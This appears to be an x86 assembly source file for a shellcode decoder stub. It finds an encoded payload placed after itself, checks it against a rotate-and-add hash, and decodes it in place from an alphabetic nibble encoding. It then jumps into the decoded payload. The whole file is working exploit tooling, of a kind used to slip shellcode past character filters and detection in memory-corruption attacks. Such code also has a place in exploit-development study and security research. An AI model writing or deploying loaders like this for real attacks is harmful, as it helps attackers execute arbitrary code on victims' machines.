section .text

global _start

_start:
    pushad
.getencodedshellcode:
    push -0x3d
    call esp
    pop esi
    mov esi, dword [esp - 0x8]
    add esi, 0x59       ; add 0x57 to the address of the encoded shellcode
    mov edi, esi
.hashcheck:
    xor eax, eax        ; lods
    cdq                 ; edx = 0
.hashloop:
    lodsb               ; al = *esi & inc esi
    cmp al, 0x20        ; check if it is a space (end of shellcode)
    je .check
    cmp al, 0x0a        ; check if it is a newline (skin formatting chars)
    je .hashloop
    ror edx, 0x17       ; rotate edx 23 bits to the right
    add edx, eax        ; add eax to edx
    jmp .hashloop
.check:
    mov eax, dword [esi]; get the hash
    cmp eax, edx        ; compare the hash
    jne .exit           ; if not equal, end the code
.decode:
    mov byte [esi - 0x1], 0x90  ; replace the space with a nop
    mov dword [esi], 0x90909090 ; replace the hash with nops
    push edi            ; push the address of the shellcode ( for call after decoding )
    pop esi             ; esi = edi
    xor eax, eax        ; eax = 0
.decodeloop:
    xor edx, edx        ; edx = 0
    lodsw               ; ax = *esi & esi += 2
    cmp al, 0x0a        ; check if it is a newline (skip formatting chars)
    je .adj
    cmp ax, 0x9090      ; check if it is a nop (end of shellcode)
    je .end
    mov dl, ah          ; dl = encoded[0] (endian)
    sub dl, 0x61        ; <================================================================ change this
    sub al, 0x61        ; <================================================================ change this
    shl al, 0x4         ; dl <<= 4
    add eax, edx        ; al += dl
    stosb               ; *edi = al & edi += 1
    jmp .decodeloop
.adj:
    dec esi             ; adjust esi
    jmp .decodeloop 
.exit:
    popad
    ret                 ; TODO?: call msgbox?
.end:
    popad
    jmp dword [esp - 0x24]  ; jump to the decoded shellcode
